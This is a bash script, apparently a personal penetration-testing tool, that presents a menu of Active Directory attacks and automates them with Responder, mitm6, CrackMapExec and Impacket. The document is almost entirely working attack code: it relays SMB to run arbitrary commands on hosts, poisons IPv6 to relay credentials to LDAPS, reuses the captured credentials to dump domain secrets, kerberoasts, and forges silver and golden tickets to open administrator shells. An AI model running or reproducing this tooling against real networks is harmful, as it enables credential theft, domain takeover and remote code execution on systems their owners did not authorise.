#!/bin/bash

if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 
   exit 1
fi

smb_relay_attack() {
echo -e "[*] make sure to disable http and smb servers in responder configuration file, otherwise the attack won't work\n"
subnet=$(ifconfig eth0 | awk '/inet / {split($2,c,"."); printf "%s.%s.%s.%s/24", c[1], c[2], c[3], 0}')
if [[ -e "targets.txt" ]]; then
  read -p "[*] targets file exist, do you want to create new one?[Y/N]" OPTION
  if [[ $OPTION == "Y" || $OPTION == "y" ]]; then
    sudo crackmapexec smb $subnet --gen-relay-list targets.txt
    echo -e "\n\n[+] targets list has been saved!"
  fi
else
    sudo crackmapexec smb $subnet --gen-relay-list targets.txt 
    echo -e "\n\n[+] targets list has been saved!"
fi
read -p "type the command you want to run when target is controlled: " CMD < /dev/tty 
Command="sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c '$CMD'" 
echo "[*] starting attack....."
xterm -e "$Command" &
xterm -e "sudo responder -I eth0 -wd" &
wait
}

mitm6_attack() {
read -p "Domain: " DOMAIN
read -p "DC ip address: " IP
echo "[+] starting mitm6 and ntlmrelayx as sudo..."
xterm -e "python /home/kali/tools/mitm6/mitm6/mitm6.py -d $DOMAIN" &
xterm -e "impacket-ntlmrelayx  -6 -t ldaps://$IP -smb2support -wh fakewpad.$DOMAIN -l /tmp/loot 2>&1 | tee /tmp/mitm6_attack_log" &
wait
echo "[*] Attack has finished, you can find log file /tmp/mitm6_attack_log and loot file in /tmp/loot"
}

dc_sync_attack() {
read -p "DC_IP: " DC_IP
read -p $'Credentials for attack:
1) use your mitm6_attack credentials
2) use your own credentials \n' OPTION
if [[ $OPTION == "1" ]]; then
    if [[ -e "/tmp/mitm6_attack_log" ]]; then
        USER=$(grep "username:" /tmp/mitm6_attack_log | awk '{print $7}')
        PASS=$(grep "username:" /tmp/mitm6_attack_log | awk '{print $10}')
    else
        echo "[-] there is no existing file for credentials, quitting"
        return
    fi
elif [[ $OPTION == "2" ]]; then
    echo -e "make sure to insert a username with elevated privileges\n"
    read -p "Username: " USER
    read -p "Password: " PASS

sudo impacket-secretsdump $USER:$PASS@$DC_IP | tee /tmp/dc_sync_log 2>/dev/null
echo -e "\n [+] output is saved at /tmp/dc_sync_log"

else
    echo "option is not valid, quitting"
    return   
fi


}

kerberoast_attack() {
read -p "Domain: " DOMAIN
read -p "DC_IP address: " DC_IP
read -p "Username: " USER
read -p "Password: " PASS
output=$(impacket-GetUserSPNs -request -dc-ip $DC_IP $DOMAIN/$USER:$PASS -outputfile /tmp/target_TGS.txt)
echo -e "\n\n[+] TGS has extracted successfully!: \n\n\n "
cat /tmp/target_TGS.txt
echo -e "\n\n [*] You can find the hash for further exploitation in /tmp/target_TGS.txt"
}

silver_ticket_attack() {
read -p "nt_hash of the machine account: " NT
read -p "Domain SID: " SID
read -p "Domain Name: " DOMAIN
read -p "Machine account name (example: PC1): " MACHINE
echo "[*] ticket in process"
echo "[*] make sure your dc, domain, and machine account are specified in your /etc/hosts file, otherwise the attack won't work"
sudo impacket-ticketer -nthash $NT -domain-sid $SID -domain $DOMAIN -spn cifs/$MACHINE.$DOMAIN Administrator
export KRB5CCNAME=./Administrator.ccache
sudo impacket-wmiexec  Administrator@$MACHINE.$DOMAIN -k -no-pass 
}

golden_ticket_attack() {
read -p "nt_hash of the krbtgt: " NT
read -p "Domain SID: " SID
read -p "Domain Name: " DOMAIN
read -p "Domain DC address: (example dc1.domain.com) " DC
echo "make sure your dc and domain are specified in your /etc/hosts file, otherwise the attack won't work"
sleep 5
sudo impacket-ticketer -nthash $NT -domain-sid $SID -domain $DOMAIN Administrator
export KRB5CCNAME=./Administrator.ccache
sudo impacket-psexec Administrator@$DC -k -no-pass

}



Menu() {
clear
echo "
 █████╗ ██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗██████╗ 
██╔══██╗██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝██╔══██╗
███████║██║  ██║    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   █████╗  ██████╔╝
██╔══██║██║  ██║    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ██╔══╝  ██╔══██╗
██║  ██║██████╔╝    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝╚═════╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                                                        "
echo -e "                                                             By Sagisar1"
echo "## this script was tested on windows server 2012"
sleep 3
read -p "[+] welcome to AD exploitation tool, please choose an attack:

1)smb relay attack
2)mitm6 attack
3)dc sync attack
4)kerberoast attack
5)pass the ticket - silver ticket attack
6)pass the ticket - golden ticket attack
7)Exit
" OPTION
}


while true; do
    Menu
    
    if [[ $OPTION == "1" || $OPTION == "1)" ]]; then
        clear
        smb_relay_attack
    elif [[ $OPTION == "2" || $OPTION == "2)" ]]; then
        clear
        mitm6_attack
    elif [[ $OPTION == "3" || $OPTION == "3)" ]]; then
        clear
        dc_sync_attack
    elif [[ $OPTION == "4" || $OPTION == "4)" ]]; then
        clear
        kerberoast_attack
    elif [[ $OPTION == "5" || $OPTION == "5)" ]]; then
        clear
        silver_ticket_attack
    elif [[ $OPTION == "6" || $OPTION == "6)" ]]; then
        clear
        golden_ticket_attack
    elif [[ $OPTION == "7" || $OPTION == "7)" ]]; then
        break
    fi
    echo -e "\n press Enter to return to menu page"
    read -s -n 1 key
done
